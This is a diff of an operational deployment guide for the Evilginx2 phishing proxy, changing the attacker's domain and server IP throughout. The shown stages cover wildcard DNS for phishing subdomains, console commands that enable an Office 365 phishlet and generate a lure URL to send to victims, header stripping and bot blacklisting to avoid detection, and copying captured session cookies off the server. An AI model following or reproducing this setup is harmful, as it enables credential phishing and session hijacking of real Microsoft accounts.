@@ -1,6 +1,6 @@
 # 🚀 EVILGINX2 — COMPLETE DOCKER DEPLOYMENT GUIDE (v13 · Rebuild Edition)
 
-**Domain:** `uni-union-onln-monie-server.store` · **Server:** `185.158.250.204` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git` (branch `master`)
+**Domain:** `gyfdghf.store` · **Server:** `176.10.118.197` · **Repo:** `https://github.com/trustwomanaturownrisk/evilginx2.git` (branch `master`)
 
 ---
 
@@ -8,7 +8,7 @@
 
 | # | Change | Failure it prevents |
 |:--|:--|:--|
-| 1 | All IPs are now `185.158.250.204` | New VPS |
+| 1 | All IPs are now `176.10.118.197` | New VPS |
 | 2 | Stage 25c rewritten: proxy commands go **inside the console**, never the shell | `Command 'proxy' not found` + a pointless `libproxy-tools` install |
 | 3 | Stage 11d logs in first and reuses a cookie jar | `{"error":"unauthorized"}` on `/api/proxies` |
 | 4 | Stage 18 compiles all three scripts and repairs a shell-wrapper paste | `SyntaxError: cd ~/evilginx2` on line 1 of `validate_phishlet.py` |
@@ -71,9 +71,9 @@
 
 | Item | Notes |
 |:--|:--|
-| VPS `185.158.250.204` with public IPv4 | 2 vCPU / 2 GB RAM. Ubuntu 22.04/24.04 or Debian 12 |
+| VPS `176.10.118.197` with public IPv4 | 2 vCPU / 2 GB RAM. Ubuntu 22.04/24.04 or Debian 12 |
 | Root SSH access | Every stage assumes root |
-| Control of `uni-union-onln-monie-server.store` | Registrar DNS panel |
+| Control of `gyfdghf.store` | Registrar DNS panel |
 | Push rights to `trustwomanaturownrisk/evilginx2` | You need a Personal Access Token |
 | A throwaway Microsoft/work account | For the capture test |
 | Cookie-Editor extension | Chrome/Edge/Brave/Firefox |
@@ -101,24 +101,24 @@
 
 **Why:** the wildcard record is mandatory — every phishlet lives on its own subdomain.
 
-1. Registrar → **Domain List** → `uni-union-onln-monie-server.store` → **Advanced DNS**
+1. Registrar → **Domain List** → `gyfdghf.store` → **Advanced DNS**
 2. Delete every "Parking Page" / default record
 3. Add exactly two:
 
 | Type | Host | Value | TTL |
 |:--|:--|:--|:--|
-| A Record | `@` | `185.158.250.204` | 1 min |
-| A Record | `*` | `185.158.250.204` | 1 min |
+| A Record | `@` | `176.10.118.197` | 1 min |
+| A Record | `*` | `176.10.118.197` | 1 min |
 
 4. On Cloudflare nameservers? Set both to **DNS only** (grey cloud).
 
 ```bash
 apt install -y dnsutils
-dig +short uni-union-onln-monie-server.store
-dig +short random123.uni-union-onln-monie-server.store
+dig +short gyfdghf.store
+dig +short random123.gyfdghf.store
 ```
 
-✅ Both print `185.158.250.204`
+✅ Both print `176.10.118.197`
 
 ❌ **Fixes:** nothing printed → wait 5 min. Parking IP → delete defaults. Only `@` works → wildcard missing. Cloudflare IP → set DNS only.
 
@@ -551,8 +551,8 @@ curl -s -o /dev/null -w "cookies endpoint: %{http_code}\n" -b /tmp/eg.jar "http:
 
 | URL | Login |
 |:--|:--|
-| `http://185.158.250.204:8082/login` | `WEBAPI_USER` / `WEBAPI_PASS` |
-| `http://185.158.250.204:5000/` | `DASHBOARD_USER` / `DASHBOARD_PASS` |
+| `http://176.10.118.197:8082/login` | `WEBAPI_USER` / `WEBAPI_PASS` |
+| `http://176.10.118.197:5000/` | `DASHBOARD_USER` / `DASHBOARD_PASS` |
 
 ✅ Both load. 8082 shows the sidebar; 5000 shows an empty list.
 
@@ -637,8 +637,8 @@ docker compose attach evilginx
 While attached:
 
 ```
-config domain uni-union-onln-monie-server.store
-config ipv4 external 185.158.250.204
+config domain gyfdghf.store
+config ipv4 external 176.10.118.197
 blacklist unauth
 config strip_headers on
 ```
@@ -646,8 +646,8 @@ config strip_headers on
 ✅
 
 ```
-[inf] server domain set to: uni-union-onln-monie-server.store
-[inf] server external IP set to: 185.158.250.204
+[inf] server domain set to: gyfdghf.store
+[inf] server external IP set to: 176.10.118.197
 [inf] blacklist mode set to: unauth
 [inf] header stripping enabled - all Evilginx artifact headers will be removed
 ```
@@ -916,13 +916,13 @@ docker compose attach evilginx
 
 ```
 phishlets
-phishlets hostname office365 uni-union-onln-monie-server.store
+phishlets hostname office365 gyfdghf.store
 phishlets enable office365
 lures create office365
 lures get-url 0
 ```
 
-✅ Table lists `office365`, `enabled phishlet`, `created lure with ID: 0`, then a URL like `https://login.uni-union-onln-monie-server.store/OWOHleQd`
+✅ Table lists `office365`, `enabled phishlet`, `created lure with ID: 0`, then a URL like `https://login.gyfdghf.store/OWOHleQd`
 
 Detach. **Send only that URL.**
 
@@ -1034,7 +1034,7 @@ The file is a JSON **array** — it must start with `[` and end with `]`. Select
 ```
 exit from the linux ssh ubuntu or debian server for evilginx and use your normal terminal cmd
 cd %USERPROFILE%\Downloads
-scp root@185.158.250.204:~/evilginx2/cookies-import.json .
+scp root@176.10.118.197:~/evilginx2/cookies-import.json .
 notepad cookies-import.json
 ```
 
@@ -1092,7 +1092,7 @@ Open a lure with `#your@email.com`, press F12 → Console.
 
 ### 25b — `rewrite_urls` (off by default — this is deliberate)
 
-It rewrites the long authorize path to `/signin?boop=<id>`. On Microsoft the page then appends `&sso_reload=true`, the reverse-lookup misses, and you get **evilginx's own 404** — `This login.uni-union-onln-monie-server.store page can't be found`.
+It rewrites the long authorize path to `/signin?boop=<id>`. On Microsoft the page then appends `&sso_reload=true`, the reverse-lookup misses, and you get **evilginx's own 404** — `This login.gyfdghf.store page can't be found`.
 
 The phishlet's `sub_filters` already handle `https://{hostname}/common/oauth2/v2.0/`, so nothing is lost.
 
@@ -1284,7 +1284,7 @@ curl -s -o /dev/null -w "8082 login page: %{http_code}\n" http://127.0.0.1:8082/
 
 # ✅ STAGE 31 — Go-live checklist
 
-- [ ] Stage 2: `dig` returns `185.158.250.204` for bare + random subdomain
+- [ ] Stage 2: `dig` returns `176.10.118.197` for bare + random subdomain
 - [ ] Stage 3: `ss -lntup | grep ':53 '` prints nothing
 - [ ] Stage 4: `ufw status` shows all seven rules
 - [ ] Stage 7: every check passed, `phishlets/` holds only `office365.yaml`
